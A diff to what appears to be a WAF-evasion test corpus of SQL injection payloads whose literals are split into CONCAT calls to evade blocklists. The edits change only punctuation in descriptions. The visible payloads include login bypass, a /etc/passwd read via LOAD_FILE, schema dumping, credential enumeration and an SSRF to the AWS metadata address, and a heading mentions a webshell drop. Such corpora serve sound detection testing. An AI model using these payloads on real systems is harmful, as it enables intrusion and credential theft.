@@ -1,5 +1,5 @@
 schema = 1
-# SQL injection payloads pre-encoded with `sql_concat_split` — every
+# SQL injection payloads pre-encoded with `sql_concat_split`: every
 # single-quoted string literal is rewritten as `CONCAT('a','b',...)`.
 # CRS and commercial WAF blocklists scan for literal substrings like
 # `'admin'`, `'password'`, `'union'`, `'/etc/passwd'`; the per-char
@@ -17,7 +17,7 @@ schema = 1
 id = "concat_split_admin_lookup"
 class = "sql"
 payload = "1 OR username=CONCAT('a','d','m','i','n')--"
-description = "OR username='admin' — the 'admin' literal is split across 5 single-char args; literal-string blocklist misses."
+description = "OR username='admin' (the 'admin' literal is split across 5 single-char args; literal-string blocklist misses)."
 
 [[case]]
 id = "concat_split_password_compare"
@@ -37,13 +37,13 @@ description = "Common privileged user lookup; 'root' substring blocked literally
 id = "concat_split_union_select_admin"
 class = "sql"
 payload = "1' UNION SELECT CONCAT('a','d','m','i','n'),NULL,NULL--"
-description = "UNION SELECT 'admin',NULL,NULL — the column-value literal is split."
+description = "UNION SELECT 'admin',NULL,NULL (the column-value literal is split)."
 
 [[case]]
 id = "concat_split_union_etc_passwd"
 class = "sql"
 payload = "1' UNION SELECT LOAD_FILE(CONCAT('/','e','t','c','/','p','a','s','s','w','d')),NULL--"
-description = "LOAD_FILE('/etc/passwd') — the path literal is decomposed; path-traversal regex on '/etc/passwd' misses."
+description = "LOAD_FILE('/etc/passwd') (the path literal is decomposed; path-traversal regex on '/etc/passwd' misses)."
 
 # ── INTO OUTFILE webshell drop ──
 
@@ -75,7 +75,7 @@ description = "Stacked INSERT for privilege escalation; both 'admin2' username a
 id = "concat_split_like_admin_prefix"
 class = "sql"
 payload = "1 OR username LIKE CONCAT('a','d','m','%')--"
-description = "Blind LIKE prefix match — 'adm%' decomposed; common credential-enumeration regex on 'adm%' misses."
+description = "Blind LIKE prefix match: 'adm%' decomposed; common credential-enumeration regex on 'adm%' misses."
 
 # ── Hostname / IP literal split (SSRF chained with SQLi) ──
 
@@ -83,7 +83,7 @@ description = "Blind LIKE prefix match — 'adm%' decomposed; common credential-
 id = "concat_split_ssrf_metadata"
 class = "sql"
 payload = "1' UNION SELECT LOAD_FILE(CONCAT('http://','1','6','9','.','2','5','4','.','1','6','9','.','2','5','4','/','l','a','t','e','s','t','/','m','e','t','a','-','d','a','t','a','/'))--"
-description = "AWS IMDS metadata SSRF via LOAD_FILE. The 169.254.169.254 IP literal — heavily fingerprinted by SSRF rules — is decomposed."
+description = "AWS IMDS metadata SSRF via LOAD_FILE. The 169.254.169.254 IP literal (heavily fingerprinted by SSRF rules (is decomposed))."
 
 # ── Time-based blind with table-name split ──
 
@@ -99,4 +99,4 @@ description = "Time-based blind verifying 'admin' user exists; the credential li
 id = "concat_split_information_schema_with_target"
 class = "sql"
 payload = "1' UNION SELECT table_name FROM information_schema.tables WHERE table_name LIKE CONCAT('%','u','s','e','r','s','%')--"
-description = "information_schema dump filtered to tables matching '%users%' — the LIKE-pattern literal is decomposed to dodge table-name-leak rules."
+description = "information_schema dump filtered to tables matching '%users%' (the LIKE-pattern literal is decomposed to dodge table-name-leak rules)."
